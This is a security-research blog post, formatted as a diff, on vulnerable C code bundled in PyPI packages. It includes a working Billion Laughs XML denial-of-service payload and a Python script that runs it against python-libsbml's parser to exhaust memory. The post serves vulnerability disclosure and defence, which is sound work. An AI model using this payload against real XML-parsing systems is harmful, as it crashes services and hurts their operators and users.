@@ -1,0 +1,95 @@
+
+While most developers — myself included —  primarily write in higher-level languages like Python or JavaScript, sometimes you need to add in native elements to improve performance or other project aspects. Since these native extension invocations are typically written in C or C++, suddenly a project primarily using JavaScript or Python must also account for potential C/C++ transient dependencies.
+In May 2021, Snyk acquired FossID, which specializes in detecting licenses and vulnerabilities in the C and C++ open-source ecosystem. FossID was then integrated into the Snyk CLI, giving it the ability to scan C and C++ dependencies.
+As a member of Snyk’s security team, I researched the results of Snyk C file scans in npm and PyPI projects leading to some interesting — and potentially scary — discoveries.
+In this post, we'll discuss the benefits that lead developers to include native C and C++ extensions in their high-level language projects. Then, we'll use Python and the PyPI registry to detect hidden C-related vulnerabilities in higher-level language projects and reveal how low-level vulnerabilities can impact seemingly safe higher-level code.
+Why include C/C++ files in a high-level language project?
+Using C files in a high-level language context may not always be straightforward, but there are many good reasons to include C code in your app.
+Runtime and performance
+Consider an interpreted language like Python. Every time we execute a Python program, we must parse and interpret the code before running it. By introducing C into the mix, Cython — a superset of Python and C — gives us the option to transpile the Python code to C code for later compilation and faster runtime.
+Hardware, resources, and memory management
+At times, we will code a program that requires “heavy” computational processing and interacts with special hardware. For example, graphic engines or cryptocurrency-related software that may interact with the GPU. We must also consider real-time components which might have limited resources. These cases are sensitive to non-deterministic operations like garbage collection, and require deterministic memory-handling — making C our go-to language.
+Lemmas and hypothesis
+Our research hypothesis is the following:
+Lemmas:
+
+There are plenty of good reasons for one to include C/C++ files in high-level languages source code and runtime environments.
+There is no ubiquitous package management system for C/C++ files.
+Hypothesis:
+If we look into high-level language packages integrating C files, we’ll be able to find C or originated-in-C vulnerabilities in that package.
+To test our hypothesis, we’ve selected Python and the PyPI ecosystem as the first candidate and our feasibility canary.
+The PyPI registry: C in Python
+At the time of this writing, there are roughly ~367,755libraries publicly accessible on PyPI.
+Our initial scan was aimed at finding all the packages (and their versions), that contain C files.
+We found ~6,200 libraries containing at least one C file —  roughly ~1.7% of the whole ecosystem.
+While this number is small when compared to the entirety of the ecosystem, it’s perfect for our research purposes. A small result set will help us detect and rule out false positives with relative ease.
+Criterion 1: Content identity
+We first tested the extracted libraries from the previous step for file identity. In this check, we tested every C file in the library to see if any are, or were, vulnerable to the CVEs we’re aware of.
+Thanks to the amazing technology by FossID that now a part of the Snyk product, we’re able to track any file to its first occurrence and can tell where a code snippet was originally found.
+In executing our first criterion, we found ~64 distinct package versions that include one or more original vulnerable source files**as-is. Expanding this number to non-version distinctiveness, we end up with 143 identical and vulnerable file occurrences**.
+Criterion 2: Content similarity
+The second criterion we tested for was file similarity.  For this study, similarity meant that while the file content may not be identical, the vulnerability-related critical-code is.
+Testing for the above (excluding criteria 1) we found ~231 distinct package versions that include one or more known vulnerable snippet(s). Leaving distinctness behind, we found 1931 identical vulnerable snippets.
+Crunching the numbers
+Consolidating the above numbers, we found ~2,074 occurrences of our criteria in PyPI packages. Since C code is typically applied to more complex engineering tasks, we were not surprised to see low-level related libraries in the result set, such as:
+
+gevent (5.7k)
+pycrypto (2.4k)
+selectolax (~500)
+In the chart below, you can see a breakdown of  C-containing Python libraries. This includes a total count (the entirety of the pie chart), what percentage was marked as vulnerable (including non-exploitable or false positives), and what percentage is vulnerable (with very high probability).
+Proving the exploitability of library vulnerabilities is neither trivial nor automatic — all reported vulnerabilities must be manually verified. However, to demonstrate that the issue we’re discussing has important real-world implications, the next section will describe a vulnerability and the severity of its exploitation.
+20 year old hidden vulnerability - python-libsbml
+One of the libraries our tool reported on was python-libsbml, a library for reading, writing, and manipulating the systems biology markup language (SBML). Since this markup language is related to XML, we weren’t surprised to see libxml2 in the project dependencies.
+Our tool marked one of the files (parser.c) as vulnerable to the Billion Laughs Attack — a 20 years old DoS vulnerability tracked as CVE-2003-1564. The Billion Laughs attack is pretty simple. All you have to do is generate enough self-referencing entities in an XML document and feed it to the parser.
+Here’s our PoC for this vulnerability.
+Create the malicious payload and save under payload.xml
+1<?xml version="1.0"?>
+2<!DOCTYPE lolz [
+3 <!ENTITY lol "lol">
+4 <!ELEMENT lolz (#PCDATA)>
+5 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+6 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+7 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+8 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+9 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+10 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+11 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+12 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+13 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+14]>
+15<lolz>&lol9;</lolz>
+Assuming you installed python-libsbml, create the following Python file:
+1import libsbml
+2import sys
+3
+4filename = sys.argv[1]
+5print(f'[*] Starting DoS; payload name -> "filename"')
+6
+7try:
+8    print(f'[+] Executing; Machine should freeze...')
+9    doc = libsbml.readSBMLFromFile(filename)
+10except Exception as e:
+11    print(f'[!] ERROR! {e}')
+12finally:
+13    print('[*] Finally reached')
+Finally, run the Python file with:
+1python exp.py payload.xml
+"If you follow the steps correctly, the CPU should increase to 100% and the memory will increase until the machine OOMs (runs out of memory). With that, we’ve executed a DoS attack on the machine.
+Though this vulnerability may not create shockwaves in the development community, imagine what would happen if a BoF, UaF, PE/RCE, or any other C code originating vulnerability was found hiding in your Python or NodeJS code. Have you ever checked for those?
+This library is downloaded ~20K times a month and is a direct dependency of ~115 public projects. Given that this is a known20 year old vulnerability, an impressive amount of unaware dependents have shipped it to their customers and users.
+What’s next?
+As we continue to find and disclose vulnerabilities to open source maintainers,  we’d like to encourage developers to look for C files in their non-C projects.
+Since these C files often lack package managers, they tend to remain as-is (or copy-pasted) for long periods of time and may later be found outdated and vulnerable (hopefully by non-malicious actors).
+Sign up for Snyk today and use our new CLI feature to scan for unmanaged C/C++ dependencies in your projects.
+Get started in capture the flag
+Learn how to solve capture the flag challenges by watching our virtual 101 workshop on demand.
+
+There are plenty of good reasons for one to include C/C++ files in high-level languages source code and runtime environments.
+There is no ubiquitous package management system for C/C++ files.
+gevent (5.7k)
+pycrypto (2.4k)
+selectolax (~500)
+python-libsbml
+libxml2
+parser.c
+payload.xml
